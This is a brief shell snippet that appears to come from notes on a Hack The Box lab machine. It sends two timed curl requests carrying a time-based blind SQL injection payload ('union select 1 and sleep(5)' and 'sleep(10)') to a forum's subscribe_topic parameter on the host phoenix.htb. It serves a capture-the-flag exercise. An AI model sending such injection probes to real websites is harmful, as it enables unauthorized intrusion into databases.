time curl -sk \
  "https://phoenix.htb/forum/?subscribe_topic=1%20union%20select%201%20and%20sleep(5)" \
  > /dev/null
time curl -sk \
  "https://phoenix.htb/forum/?subscribe_topic=1%20union%20select%201%20and%20sleep(10)" \
  > /dev/null
